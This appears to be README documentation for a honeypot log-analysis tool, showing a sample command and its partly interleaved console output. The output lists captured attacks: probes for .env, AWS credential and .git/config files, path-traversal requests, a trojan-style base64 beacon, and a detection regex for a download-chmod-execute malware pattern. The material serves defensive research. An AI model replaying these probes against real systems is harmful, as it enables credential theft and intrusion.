Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/dns.log
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/ssh.log
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/web/webhoneypot-2024-01-29.json
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/ntp.log
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/conn.log
Done organizing attack directories
Finished organizing attacks into attack directories at /Users/lucasfaudman/Documents/SANS/testenv/attacks
Honeypot AI Finished Successfully!
```

</details>


> Load attacks from the attacks directory with at least 5 commands, or at least 3 HTTP requests then print the first session, last 2 sessions, 3 most common HTTP requests and the most common src ip for each attack

```bash
honeypot-ai/run.sh --load-from-attacks-dir --min-commands 5 --min-http-requests 3 --print-attrs first_session last2_sessions most_common3_http_requests most_common_src_ip
```

<details>
<summary>
Output
</summary>


```
lucasfaudman@Lucass-MacBook-Pro testenv % honeypot-ai/run.sh --load-from-attacks-dir --min-commands 5 --min-http-requests 3 --print-attrs first_session last2_sessions most_common3_http_requests most_common_src_ip        
Starting honeypot-ai...

Loading attacks from attacks directory at /Users/lucasfaudman/Documents/SANS/testenv/attacks
Loading 39 attacks in parallel with 2 workers.
WARNING: Output may be jumbled. If errors occur, try again with --load-attacks-max-workers 1
Loading Attack: 249a049e611f83823c514eb7b904977ae94371768ea3a93160378a9f757827cc
Processing Events from Parser 1 of 2: <loganalyzers.logparser.ZeekParser object at 0x109220050>
Loading Attack: 0c5e35708d1ddce35bd8d2c3ec1a04a2ecaa2ec203071d00591afa6f24f01f98
Processing Events from Parser 1 of 2: <loganalyzers.logparser.ZeekParser object at 0x10c703790>
Processing Events from Parser 2 of 2: <loganalyzers.logparser.CowrieParser object at 0x109223c90>
Processing Events from Parser 2 of 2: <loganalyzers.logparser.CowrieParser object at 0x10c71b090>
Loading Attack: a23e9121e296bd9ba20a37c2cc6f2fab5285e2f6efd635841d835724544d6758
Processing Events from Parser 1 of 2: <loganalyzers.logparser.ZeekParser object at 0x10c395f10>
Loading Attack: 79cee4cdd57b016e9a6cdc9b23385b110da33ec808b64670bcf45b0661db1a65
Processing Events from Parser 1 of 2: <loganalyzers.logparser.ZeekParser object at 0x109223e50>
Loaded Attack: 249a049e611f83823c514eb7b904977ae94371768ea3a93160378a9f757827cc
Loaded Attack: 0c5e35708d1ddce35bd8d2c3ec1a04a2ecaa2ec203071d00591afa6f24f01f98
Processing Events from Parser 2 of 2: <loganalyzers.logparser.CowrieParser object at 0x109241410>
Loading Attack: 6ef6eba782945c5c6d677a2ea8e1fc8320bfae6eb3800f5e7888c3b266479f00
Processing Events from Parser 1 of 2: <loganalyzers.logparser.ZeekParser object at 0x1091d0d10>
Processing Events from Parser 2 of 2: <loganalyzers.logparser.CowrieParser object at 0x109247a50>
Loading Attack: 28ba533b0f3c4df63d6b4a5ead73860697bdf735bb353e4ca928474889eb8a15
Processing Events from Parser 1 of 2: <loganalyzers.logparser.ZeekParser object at 0x109223d50>
Processing Events from Parser 2 of 2: <loganalyzers.logparser.CowrieParser object at 0x1089ab6d0>
Loading Attack: 3b6819f4180302fda913f82fcc8c8b4de5370e7d761872207a5dbf0cc2f750f7essed 2415 events (0 cowrie events, 2415 zeek events). Found 1 source ips
Processing Events from Parser 1 of 2: <loganalyzers.logparser.ZeekParser object at 0x10934e250>
Processing Events from Parser 2 of 2: <loganalyzers.logparser.CowrieParser object at 0x10934fb50>ps
Processing Events from Parser 2 of 2: <loganalyzers.logparser.CowrieParser object at 0x10c724490>
Loading Attack: 1bd476ad78c1f8fd54963653f838e608ef25d8a0a9e84a54fcd1b3889ada6fae
Processing Events from Parser 1 of 2: <loganalyzers.logparser.ZeekParser object at 0x108e3e0d0>
Processing Events from Parser 2 of 2: <loganalyzers.logparser.CowrieParser object at 0x1091f0f10>
Loading Attack: 2052f501395004cd5eadfe6b8e9fba9d0be7b1c31f9864e9eb68d3490a5d3c55
Processing Events from Parser 1 of 2: <loganalyzers.logparser.ZeekParser object at 0x1090ea290>
Processing Events from Parser 2 of 2: <loganalyzers.logparser.CowrieParser object at 0x109999f10>
Loading Attack: d9e9714edf4333cdaeeaa837d3542451931a587a47d48afce527cfc81ea8e144
Processing Events from Parser 1 of 2: <loganalyzers.logparser.ZeekParser object at 0x108d0ce50>
Processing Events from Parser 2 of 2: <loganalyzers.logparser.CowrieParser object at 0x109a1f8d0>
Loading Attack: 7da13397216e915d3648622960fa18ea26295ad5f180cf1346511991dc689ea9
Processing Events from Parser 1 of 2: <loganalyzers.logparser.ZeekParser object at 0x10c5fdfd0>
Processing Events from Parser 2 of 2: <loganalyzers.logparser.CowrieParser object at 0x10c71b210>
Loaded Attack: a23e9121e296bd9ba20a37c2cc6f2fab5285e2f6efd635841d835724544d6758
Loaded Attack: 79cee4cdd57b016e9a6cdc9b23385b110da33ec808b64670bcf45b0661db1a65
Loaded Attack: 6ef6eba782945c5c6d677a2ea8e1fc8320bfae6eb3800f5e7888c3b266479f00
Loaded Attack: 28ba533b0f3c4df63d6b4a5ead73860697bdf735bb353e4ca928474889eb8a15
Loaded Attack: 3b6819f4180302fda913f82fcc8c8b4de5370e7d761872207a5dbf0cc2f750f7
Loaded Attack: 1bd476ad78c1f8fd54963653f838e608ef25d8a0a9e84a54fcd1b3889ada6fae
Loaded Attack: 2052f501395004cd5eadfe6b8e9fba9d0be7b1c31f9864e9eb68d3490a5d3c55
Loading Attack: 2b5bfc8daca85f59084e942c25bd635e6519a07f1e2847fd8c6af18038c608a6
Processing Events from Parser 1 of 2: <loganalyzers.logparser.ZeekParser object at 0x1091ac810>
Processing Events from Parser 2 of 2: <loganalyzers.logparser.CowrieParser object at 0x109876dd0>
Loaded Attack: d9e9714edf4333cdaeeaa837d3542451931a587a47d48afce527cfc81ea8e144
Loading Attack: ffc86c13c2614123fced454ae877687ceae7759a81df85d61960f7c2079faf59
Processing Events from Parser 1 of 2: <loganalyzers.logparser.ZeekParser object at 0x1098745d0>
Loading Attack: 3c9d7241372c627d30ffb3a9868fbf4c4fc2ec4b0c4e0ac7909ddfcefc6bcaf9
Processing Events from Parser 1 of 2: <loganalyzers.logparser.ZeekParser object at 0x10c777e90>
Processing Events from Parser 2 of 2: <loganalyzers.logparser.CowrieParser object at 0x10c777f90>
Loaded Attack: 7da13397216e915d3648622960fa18ea26295ad5f180cf1346511991dc689ea9
Loading Attack: a55636347c67b3744e5bd21dede42f7de1db694a586d10ef47a9eb8d23d275f9
Processing Events from Parser 1 of 2: <loganalyzers.logparser.ZeekParser object at 0x10bc4c4d0>
Loaded Attack: 2b5bfc8daca85f59084e942c25bd635e6519a07f1e2847fd8c6af18038c608a6
Processing Events from Parser 2 of 2: <loganalyzers.logparser.CowrieParser object at 0x10c74d6d0>
Loading Attack: 50758fb09c87e81299ba39f366474396f6eb9a82068707505780307a7021ccd2
Processing Events from Parser 1 of 2: <loganalyzers.logparser.ZeekParser object at 0x10c60ced0>
Processing Events from Parser 2 of 2: <loganalyzers.logparser.CowrieParser object at 0x109875c50>
Loading Attack: 6fa4c8ac58e7a1d947dc3250c39d1e27958f012e68061d8de0a7b70e3a65b906
Processing Events from Parser 1 of 2: <loganalyzers.logparser.ZeekParser object at 0x109097a10>
Processing Events from Parser 2 of 2: <loganalyzers.logparser.CowrieParser object at 0x108e6ced0>
Loaded Attack: ffc86c13c2614123fced454ae877687ceae7759a81df85d61960f7c2079faf59
Loaded Attack: 3c9d7241372c627d30ffb3a9868fbf4c4fc2ec4b0c4e0ac7909ddfcefc6bcaf9
Loaded Attack: a55636347c67b3744e5bd21dede42f7de1db694a586d10ef47a9eb8d23d275f9
Loading Attack: 51e82af9c7a10e0c74d49799d1344fd73a08d95cee17a9b7ed1644e981905f13
Processing Events from Parser 1 of 2: <loganalyzers.logparser.ZeekParser object at 0x10914da50>
Processing Events from Parser 2 of 2: <loganalyzers.logparser.CowrieParser object at 0x1098db350>
Loading Attack: 1ae2a0aa7da872071305a1170015dfebfd7e40ebb8cb16a15979522836b53687
Processing Events from Parser 1 of 2: <loganalyzers.logparser.ZeekParser object at 0x108d1d810>
Processing Events from Parser 2 of 2: <loganalyzers.logparser.CowrieParser object at 0x1098cdf50>
Processed 635 events (0 cowrie eventLoading Attack: 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c
Processing Events from Parser 1 of 2: <loganalyzers.logparser.ZeekParser object at 0x1091f1f50>
Processing Events from Parser 2 of 2: <loganalyzers.logparser.CowrieParser object at 0x109975910>
Loading Attack: 30d72557f4e8b64fba88e86ce784ac08339fca517863f30d194830c90ff72a01
Processing Events from Parser 1 of 2: <loganalyzers.logparser.ZeekParser object at 0x1098cef90>
Processing Events from Parser 2 of 2: <loganalyzers.logparser.CowrieParser object at 0x1098ccd90>s). Found 1 source ips
Loading Attack: 4da3ee2625bb069ebb113ec1ce45b4f5b8ec39e3e743330b94f6c15e4c25f84a
Processing Events from Parser 1 of 2: <loganalyzers.logparser.ZeekParser object at 0x108d1d810>
Processing Events from Parser 2 of 2: <loganalyzers.logparser.CowrieParser object at 0x109a1c2d0>
Loading Attack: ed38805b5dd55c277dcbebb9c4db218b036f9cae287ba106cc774ec3da18bfcf
Processing Events from Parser 1 of 2: <loganalyzers.logparser.ZeekParser object at 0x108ceb490>
Processing Events from Parser 2 of 2: <loganalyzers.logparser.CowrieParser object at 0x1090ea290>
Processing Events from Parser 2 of 2: <loganalyzers.logparser.CowrieParser object at 0x10c772ed0>
Loading Attack: 6536b48b9a0b55e0ce90043b2eb5bba229ac18ef6100a8b7f474318db4e11db1
Processing Events from Parser 1 of 2: <loganalyzers.logparser.ZeekParser object at 0x1098cfb90>
Processing Events from Parser 2 of 2: <loganalyzers.logparser.CowrieParser object at 0x1098ce790>
Loading Attack: 0ad0d02f9c317f120457c60054218fe8e53c3ed63546ef9681986d143a49a518
Processing Events from Parser 1 of 2: <loganalyzers.logparser.ZeekParser object at 0x1099f9950>
Loading Attack: 7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d
Processing Events from Parser 1 of 2: <loganalyzers.logparser.ZeekParser object at 0x11f285110>
Processing Events from Parser 2 of 2: <loganalyzers.logparser.CowrieParser object at 0x11f284710>
Loading Attack: a66a6d7f44765043006458e840366d2331e12ec7361c05f002dfab81a9e950609 cowrie events, 2 zeek events). Found 1 source ips
Processing Events from Parser 1 of 2: <loganalyzers.logparser.ZeekParser object at 0x10c5b87d0>
Processing Events from Parser 2 of 2: <loganalyzers.logparser.CowrieParser object at 0x11f2859d0>
Processed 247 events (0 cowrie events, 247 zeeLoading Attack: 28d2ac3befde61d0e429298eab1a7938c81935678d9169e177a674f741ca7c2e
Processing Events from Parser 1 of 2: <loganalyzers.logparser.ZeekParser object at 0x11f285050>
Processing Events from Parser 2 of 2: <loganalyzers.logparser.CowrieParser object at 0x10c467650>
Loaded Attack: 50758fb09c87e81299ba39f366474396f6eb9a82068707505780307a7021ccd2
Loaded Attack: 6fa4c8ac58e7a1d947dc3250c39d1e27958f012e68061d8de0a7b70e3a65b906
Loaded Attack: 51e82af9c7a10e0c74d49799d1344fd73a08d95cee17a9b7ed1644e981905f13
Loaded Attack: 1ae2a0aa7da872071305a1170015dfebfd7e40ebb8cb16a15979522836b53687
Loaded Attack: 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c
Loaded Attack: 30d72557f4e8b64fba88e86ce784ac08339fca517863f30d194830c90ff72a01
Loaded Attack: 4da3ee2625bb069ebb113ec1ce45b4f5b8ec39e3e743330b94f6c15e4c25f84a
Loaded Attack: ed38805b5dd55c277dcbebb9c4db218b036f9cae287ba106cc774ec3da18bfcf
Loaded Attack: 6536b48b9a0b55e0ce90043b2eb5bba229ac18ef6100a8b7f474318db4e11db1
Loading Attack: 7ab552f01de999cb12092166cdc36fd68a0edbb33927e0ef3d26f4ee6449f804
Processing Events from Parser 1 of 2: <loganalyzers.logparser.ZeekParser object at 0x10c771cd0>
Processing Events from Parser 2 of 2: <loganalyzers.logparser.CowrieParser object at 0x10c770650>d 2 source ips
Processing Events from Parser 2 of 2: <loganalyzers.logparser.CowrieParser object at 0x10912d990> (1644 cowrie events, 823 zeek events). Found 5 source ips
Loading Attack: bc816b9b031183662a273fbc558312d1b2950f19a0d2d91345474a152011f6bf
Processing Events from Parser 1 of 2: <loganalyzers.logparser.ZeekParser object at 0x10c6e4e10>
Processing Events from Parser 2 of 2: <loganalyzers.logparser.CowrieParser object at 0x10c6a9310>
Loading Attack: 0b60b47c6cbbec8f0c44289158db12490185b6ef821e8b1946a745c8b300ac67
Processing Events from Parser 1 of 2: <loganalyzers.logparser.ZeekParser object at 0x10c63e6d0>
Processing Events from Parser 2 of 2: <loganalyzers.logparser.CowrieParser object at 0x10c9fe410>
Loading Attack: eafdc691c2945a067fa5de7bac393326241395a9cd11bc6737c7191859f13b80
Processing Events from Parser 1 of 2: <loganalyzers.logparser.ZeekParser object at 0x10c9e9510>
Loading Attack: c4927e4103e250b181e76582991f71a7a3987ccae02ad1fc8cff377e65871199
Processing Events from Parser 1 of 2: <loganalyzers.logparser.ZeekParser object at 0x109341b50>
Processing Events from Parser 2 of 2: <loganalyzers.logparser.CowrieParser object at 0x1093409d0>
Loading Attack: 7ea3ab134f5340790a7a9d64915c9aa8418f3c9707cff0ab76b2ce4e33da9656
Processing Events from Parser 1 of 2: <loganalyzers.logparser.ZeekParser object at 0x109a57890>
Loaded Attack: 0ad0d02f9c317f120457c60054218fe8e53c3ed63546ef9681986d143a49a518
Loaded Attack: 7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d
Loaded Attack: a66a6d7f44765043006458e840366d2331e12ec7361c05f002dfab81a9e95060
Loaded Attack: 28d2ac3befde61d0e429298eab1a7938c81935678d9169e177a674f741ca7c2e
Loaded Attack: 7ab552f01de999cb12092166cdc36fd68a0edbb33927e0ef3d26f4ee6449f804
Loaded Attack: bc816b9b031183662a273fbc558312d1b2950f19a0d2d91345474a152011f6bf
Loaded Attack: 0b60b47c6cbbec8f0c44289158db12490185b6ef821e8b1946a745c8b300ac67
Processing Events from Parser 2 of 2: <loganalyzers.logparser.CowrieParser object at 0x10c9e9550>
Processing Events from Parser 2 of 2: <loganalyzers.logparser.CowrieParser object at 0x109a57cd0>wrie events, 2081 zeek events). Found 10 source ips
Loading Attack: f9c78e80544b19ef2c5ee00ca276136cbfdd61d5ae8cfbd904e1b5adbd66830d
Processing Events from Parser 1 of 2: <loganalyzers.logparser.ZeekParser object at 0x1091ab6d0>
Processing Events from Parser 2 of 2: <loganalyzers.logparser.CowrieParser object at 0x10931d450>
Loading Attack: 801f77ad815592be4a10b2c6b624d2f93117eb141fb2fc3cef008cce6c496ade
Processing Events from Parser 1 of 2: <loganalyzers.logparser.ZeekParser object at 0x1089ab6d0>
Processing Events from Parser 2 of 2: <loganalyzers.logparser.CowrieParser object at 0x108d09a90>
Loading Attack: f9a22a65178153d25e6a84189570709a0aced94197404093eff5cea464b865ac
Processing Events from Parser 1 of 2: <loganalyzers.logparser.ZeekParser object at 0x10931ed50>
Processing Events from Parser 2 of 2: <loganalyzers.logparser.CowrieParser object at 0x10931fd90>
Loading Attack: 846f2a6c936a5c60bf416fa277a315d852da3ed0f52d2c9e22aca882ad3e17d2
Processing Events from Parser 1 of 2: <loganalyzers.logparser.ZeekParser object at 0x1099f8150>
Processing Events from Parser 2 of 2: <loganalyzers.logparser.CowrieParser object at 0x1099f87d0>
Loading Attack: 63a01ec266fce76ebdb77cc72df4d2adde52f742d7f02204eb0a302b71378a88
Processing Events from Parser 1 of 2: <loganalyzers.logparser.ZeekParser object at 0x10874a690>
Processing Events from Parser 2 of 2: <loganalyzers.logparser.CowrieParser object at 0x1099f8b50>
Loaded Attack: eafdc691c2945a067fa5de7bac393326241395a9cd11bc6737c7191859f13b80s
Loaded Attack: c4927e4103e250b181e76582991f71a7a3987ccae02ad1fc8cff377e65871199
Loaded Attack: 7ea3ab134f5340790a7a9d64915c9aa8418f3c9707cff0ab76b2ce4e33da9656
Loaded Attack: f9c78e80544b19ef2c5ee00ca276136cbfdd61d5ae8cfbd904e1b5adbd66830d
Loaded Attack: 801f77ad815592be4a10b2c6b624d2f93117eb141fb2fc3cef008cce6c496ade
Loaded Attack: f9a22a65178153d25e6a84189570709a0aced94197404093eff5cea464b865ac
Loaded Attack: 846f2a6c936a5c60bf416fa277a315d852da3ed0f52d2c9e22aca882ad3e17d2
Loaded Attack: 63a01ec266fce76ebdb77cc72df4d2adde52f742d7f02204eb0a302b71378a88
(30->30) - Removed 0 attacks with ips ['216.243.47.166', '172.31.5.68', '54.67.87.80']
Attempting merge 2610: 28ba533b0f3c4df63d6b4a5ead73860697bdf735bb353e4ca928474889eb8a15 <- c4927e4103e250b181e76582991f71a7a3987ccae02ad1fc8cff377e65871199 by malware_urls
Merged 0 attacks by out of 2610 attempts (0.0000%) 
Merge Attacks Time: 0.2761s
(30->30) - Merged 0 attacks with shared attrs
Regex merged 1b82ac2aca7cd9b3b1d352dbb024a1ae736579e23860b353be95f5e19d160d51 into 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c on commands: re.compile('cd /tmp && chmod \+x [\w\d]+ && bash -c ./[\w\d]+')
Regex merged b9e33cd433b4c78c80e6233e829f5b57b64940e83ea8733978300becc3f5a23f into 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c on commands: re.compile('cd /tmp && chmod \+x [\w\d]+ && bash -c ./[\w\d]+')
(30->28) - Merged 2 attacks with shared sig regexes

Attack (hhash: 7ea3ab134f5340790a7a9d64915c9aa8418f3c9707cff0ab76b2ce4e33da9656), SourceIPs: 10, Sessions: 1316, HTTP: 1306, Httplogs: 147 
first_session:
Session CLoyo34tvM4hZDxHKk HTTP 35.85.244.164:45122 -> 172.31.5.68:80 HTTP Requests: 1, Duration: 0.08s

last2_sessions:
[Session CRMNCT15V32oceAp28 HTTP 52.81.27.255:55384 -> 172.31.5.68:80 HTTP Requests: 1, Duration: 0.22s,
 Session CMhxeS1vuKMhhchxUh HTTP 52.81.27.255:55394 -> 172.31.5.68:80 HTTP Requests: 1, Duration: 0.30s]

most_common3_http_requests:
[('GET /docker/.env HTTP/1.1
'
  'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like '
  'Gecko) Chrome/81.0.4044.129 Safari/537.36
'
  'Host: 54.67.87.80',
  12),
 ('GET /.env HTTP/1.1
'
  'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
  '(KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
'
  'Host: 54.67.87.80',
  11),
 ('POST /.env HTTP/1.1
'
  'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
  '(KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
'
  'Host: 54.67.87.80',
  11)]

most_common_src_ip:
'54.222.143.33'


Attack (hhash: 1bd476ad78c1f8fd54963653f838e608ef25d8a0a9e84a54fcd1b3889ada6fae), SourceIPs: 5, Sessions: 277, HTTP: 18, Httplogs: 1 
first_session:
Session CBtQeU2VOWNp9HFJF6 CONN 66.240.205.34:18081 -> 172.31.5.68:1800 Duration: 0.00s

last2_sessions:
[Session Cu2DDx1MeDhuVRDABh CONN 66.240.205.34:17525 -> 172.31.5.68:80 Duration: 0.00s,
 Session CWz5rs12bo9VvFKY58 CONN 66.240.205.34:33106 -> 172.31.5.68:80 Duration: 0.00s]

most_common3_http_requests:
[("145.ll|'|'|SGFjS2VkX0Q0OTkwNjI3|'|'|WIN-JNAPIER0859|'|'|JNapier|'|'|19-02-01|'|'||'|'|Win "
  '7 Professional SP1 '
  "x64|'|'|No|'|'|0.7d|'|'|..|'|'|AA==|'|'|112.inf|'|'|SGFjS2VkDQoxOTIuMTY4LjkyLjIyMjo1NTUyDQpEZXNrdG9wDQpjbGllbnRhLmV4ZQ0KRmFsc2UNCkZhbHNlDQpUcnVlDQpGYWxzZQ==12.act|'|'|AA= "
  'HTTP/
',
  10),
 ('GET / HTTP/1.0
', 4),
 ('  HTTP/1.1
', 4)]

most_common_src_ip:
'66.240.205.34'


Attack (chash: 1ae2a0aa7da872071305a1170015dfebfd7e40ebb8cb16a15979522836b53687), SourceIPs: 4, Sessions: 19, SSH: 7, Commands: 8, Cmdlogs: 1, 
first_session:
Session CaD9804xwBAGhgGqjh CONN 31.208.22.102:45084 -> 172.31.5.68:22 Duration: 0.00s

last2_sessions:
[Session 0f1605bd0344 SSH 31.208.22.102:54334 -> 172.31.5.68:2222 Login: root:12345 Commands: 8, Duration: 0.23s,
 Session 8445fa23f411 SSH 73.43.215.50:60428 -> 172.31.5.68:2222 Login: root:12345 Commands: 8, Duration: 0.55s]

most_common3_http_requests:
[]

most_common_src_ip:
'31.208.22.102'


Attack (hhash: 0ad0d02f9c317f120457c60054218fe8e53c3ed63546ef9681986d143a49a518), SourceIPs: 3, Sessions: 1836, HTTP: 1836, Httplogs: 520 
first_session:
Session CK2PaY2DzYqqwetGl5 HTTP 18.138.212.58:48534 -> 172.31.5.68:80 HTTP Requests: 1, Duration: 0.17s

last2_sessions:
[Session CvQxfO1IGH8VTiMh99 HTTP 13.250.8.18:52438 -> 172.31.5.68:80 HTTP Requests: 1, Duration: 0.17s,
 Session CXn6c71BIWGTfsCnO HTTP 13.250.8.18:52442 -> 172.31.5.68:80 HTTP Requests: 1, Duration: 0.17s]

most_common3_http_requests:
[('GET /server-status HTTP/1.1
'
  'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) '
  'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
'
  'Host: 54.67.87.80',
  3),
 ('GET /login.sh HTTP/1.1
'
  'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) '
  'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
'
  'Host: 54.67.87.80',
  3),
 ('GET /config.xml HTTP/1.1
'
  'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) '
  'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
'
  'Host: 54.67.87.80',
  3)]

most_common_src_ip:
'18.116.202.221'


Attack (hhash: 6536b48b9a0b55e0ce90043b2eb5bba229ac18ef6100a8b7f474318db4e11db1), SourceIPs: 3, Sessions: 197, HTTP: 21, Httplogs: 2 
first_session:
Session Cs9MHY2v8BMW7YMEHk CONN 68.69.186.30:54674 -> 172.31.5.68:80 Duration: 0.00s

last2_sessions:
[Session C3Lh024LdclPNcWSH CONN 91.92.243.232:50260 -> 172.31.5.68:34567 Duration: 0.00s,
 Session ClWZQW3AWC0UFesz49 CONN 91.92.243.232:34834 -> 172.31.5.68:9527 Duration: 0.00s]

most_common3_http_requests:
[('GET ../../proc/ HTT HTTP/0.9
', 14),
 ('GET / HTTP/1.1
Host: 54.67.87.80:80', 7)]

most_common_src_ip:
'68.69.186.30'


Attack (hhash: 2052f501395004cd5eadfe6b8e9fba9d0be7b1c31f9864e9eb68d3490a5d3c55), SourceIPs: 3, Sessions: 98, HTTP: 63, Httplogs: 6 
first_session:
Session CwCeL925imgQXQpF3b CONN 185.180.143.49:32672 -> 172.31.5.68:2083 Duration: 0.00s

last2_sessions:
[Session CDT2ht9F22UMFRoGa CONN 185.180.143.49:22143 -> 172.31.5.68:8081 Duration: 0.00s,
 Session Cy5jFX2UsRusWJLLGa CONN 185.180.143.49:38982 -> 172.31.5.68:8082 Duration: 0.00s]

most_common3_http_requests:
[('GET / HTTP/1.1
'
  'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
  '(KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 
'
  'Host: 54.67.87.80',
  13),
 ('HEAD /icons/sphere1.png HTTP/1.1
'
  'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
  '(KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 
'
  'Host: 54.67.87.80',
  4),
 ('HEAD /icons/.2e/.2e/apache2/icons/non-existant-image.png HTTP/1.1
'
  'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
  '(KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 
'
  'Host: 54.67.87.80',
  4)]

most_common_src_ip:
'185.180.143.49'


Attack (hhash: 51e82af9c7a10e0c74d49799d1344fd73a08d95cee17a9b7ed1644e981905f13), SourceIPs: 3, Sessions: 75, HTTP: 48, Httplogs: 16 
first_session:
Session CSMED74voIywrNa3L4 CONN 164.92.192.25:56438 -> 172.31.5.68:9587 Duration: 0.00s

last2_sessions:
[Session Cb7TSN2tAPg6c8igj4 CONN 164.92.192.25:42910 -> 172.31.5.68:87 Duration: 0.00s,
 Session CL0qvF1RtGN12T8XDk CONN 138.68.163.10:55143 -> 172.31.5.68:3306 Duration: 0.00s]

most_common3_http_requests:
[('GET / HTTP/1.1
Host: 54.67.87.80', 3),
 ('GET / HTTP/
Host: 54.67.87.80', 3),
 ('GET / HTTP/1.1
'
  'User-Agent: Mozilla/5.0 (Linux; Android 6.0; HTC One M9 Build/MRA86362) '
  'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.9103.98 Mobile '
  'Safari/537.3
'
  'Host: 54.67.87.80',
  3)]

most_common_src_ip:
'164.92.192.25'


Attack (mhash: 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c), SourceIPs: 3, Sessions: 24, SSH: 20, Commands: 3, Cmdlogs: 4, Malware: 3 
first_session:
Session CmMj7Y1TLuJ5YCKDWl CONN 93.223.169.159:60702 -> 172.31.5.68:22 Duration: 0.00s

last2_sessions:
[Session c0a95962c75a SSH 111.216.194.148:52922 -> 172.31.5.68:2222 Login: pi:raspberryraspberry993311 Commands: 1, Malware: 1, Duration: 0.52s,
 Session 9a98fb146784 SSH 111.216.194.148:52964 -> 172.31.5.68:2222 Login: pi:raspberryraspberry993311 Commands: 2, Duration: 0.28s]

most_common3_http_requests:
[]

most_common_src_ip:
'93.223.169.159'


Attack (hhash: 6ef6eba782945c5c6d677a2ea8e1fc8320bfae6eb3800f5e7888c3b266479f00), SourceIPs: 2, Sessions: 26, HTTP: 20, Httplogs: 9 
first_session:
Session CNayL84U0uEIcLMHr6 CONN 91.92.249.164:45474 -> 172.31.5.68:80 Duration: 0.00s

last2_sessions:
[Session CpUNle4xFlHtuUtbI8 HTTP 94.156.65.188:40398 -> 172.31.5.68:8080 HTTP Requests: 1, Duration: 0.14s,
 Session C2eNBwVPwdBs4zoDf HTTP 94.156.65.188:40414 -> 172.31.5.68:8080 HTTP Requests: 1, Duration: 0.14s]

most_common3_http_requests:
[('HEAD / HTTP/1.0
', 4),
 ('GET /.git/config HTTP/1.1
'
  'User-Agent: Go-http-client/1.1
'
  'Host: ec2-54-67-87-80.us-west-1.compute.amazonaws.com:80',
  2),
 ('GET /static../.git/config HTTP/1.1
'
  'User-Agent: Go-http-client/1.1
'
  'Host: ec2-54-67-87-80.us-west-1.compute.amazonaws.com:80',
  2)]

most_common_src_ip:
'91.92.249.164'


Attack (chash: 28ba533b0f3c4df63d6b4a5ead73860697bdf735bb353e4ca928474889eb8a15), SourceIPs: 1, Sessions: 1053, SSH: 771, Commands: 29, Cmdlogs: 1, 
first_session:
Session CBA62w1ruDQY6Ipt3 CONN 150.158.27.38:65032 -> 172.31.5.68:22 Duration: 0.00s

last2_sessions:
[Session 6313658d4420 SSH 150.158.27.38:62358 -> 172.31.5.68:2222 Duration: 0.52s,
 Session 6153d46b3961 SSH 150.158.27.38:55626 -> 172.31.5.68:2222 Duration: 0.49s]

most_common3_http_requests:
[]

most_common_src_ip:
'150.158.27.38'


Attack (hhash: 50758fb09c87e81299ba39f366474396f6eb9a82068707505780307a7021ccd2), SourceIPs: 1, Sessions: 560, HTTP: 560, Httplogs: 560 
first_session:
Session CQ14tp2zTuumKSN44f HTTP 188.166.224.136:59800 -> 172.31.5.68:80 HTTP Requests: 1, Duration: 0.26s

last2_sessions:
[Session CsKSDD3vzH2zr8b704 HTTP 188.166.224.136:53660 -> 172.31.5.68:80 HTTP Requests: 1, Duration: 0.21s,
 Session C05GLvtcZBqB9XDGk HTTP 188.166.224.136:53672 -> 172.31.5.68:80 HTTP Requests: 1, Duration: 0.18s]

most_common3_http_requests:
[('GET /?pp=env HTTP/1.1
'
  'User-Agent: Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) '
  'AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 '
  'Moblie Safari/537.36
'
  'Host: ec2-54-67-87-80.us-west-1.compute.amazonaws.com',
  1),
 ('GET /.aws/credentials HTTP/1.1
'
  'User-Agent: Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) '
  'AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 '
  'Moblie Safari/537.36
'
  'Host: ec2-54-67-87-80.us-west-1.compute.amazonaws.com',
  1),
 ('GET /.env HTTP/1.1
'
  'User-Agent: Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) '
  'AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 '
  'Moblie Safari/537.36
'
  'Host: ec2-54-67-87-80.us-west-1.compute.amazonaws.com',
  1)]

